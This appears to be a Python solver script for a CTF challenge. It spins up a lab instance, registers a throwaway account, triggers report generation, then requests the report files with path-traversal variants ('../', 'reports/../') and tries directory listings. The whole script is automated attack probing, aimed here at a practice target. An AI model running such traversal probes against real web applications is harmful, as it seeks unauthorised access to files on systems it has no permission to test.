import sys, re, json, time, requests, urllib3
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r"D:\ctf-index")
from cylab2 import CyLab
urllib3.disable_warnings()

cy = CyLab(delay=0.5)
cy.login()
cy.req("PUT", "/api/challenges/752/instance/?source=library")
base = None
for _ in range(12):
    time.sleep(0.9)
    st, b = cy.req("GET", "/api/challenges/752/instance/")
    d = json.loads(b) if b.startswith("{") else {}
    m = re.search(r"(https?://[A-Za-z0-9.\-]+:\d+)", d.get("description") or "")
    if m:
        base = m.group(1).rstrip("/") + "/"
        break
print("base:", base)
s = requests.Session()
u = "q%d" % (int(time.time() * 11) % 100000)
s.post(base + "signup", data={"username": u, "email": u + "@x.io", "password": "pw"}, timeout=30)
time.sleep(0.8)
s.post(base + "login", data={"username": u, "password": "pw"}, timeout=30)
time.sleep(0.8)
s.post(base + "expenses", data={"description": "secret_test", "amount": "42", "date": "2024-05-01"}, timeout=30)
time.sleep(1.0)
s.post(base + "generate_report", data={}, timeout=30)
time.sleep(1.0)
r = s.get(base + "inbox", timeout=30)
paths = re.findall(r"(\./reports/[^\s\"'<>]+\.csv)", r.text)
print("rapports:", paths)
for p in paths:
    rel = p[2:] if p.startswith("./") else p
    for cand in (rel, "../" + rel, rel.replace("reports/", "reports/../")):
        try:
            rr = s.get(base + cand, timeout=20)
            print("%-52s -> %d (%d octets)" % (cand[:52], rr.status_code, len(rr.text)))
            if rr.status_code == 200 and len(rr.text) < 5000:
                print("   contenu:", rr.text[:400].replace("\n", " | "))
        except Exception as e:
            print(cand[:52], "ERR", type(e).__name__)
        time.sleep(0.5)
# tenter un listing du dossier reports
for cand in ("reports/", "static/", "reports"):
    try:
        rr = s.get(base + cand, timeout=20)
        print("%-20s -> %d (%d)" % (cand, rr.status_code, len(rr.text)))
    except Exception as e:
        print(cand, "ERR", type(e).__name__)
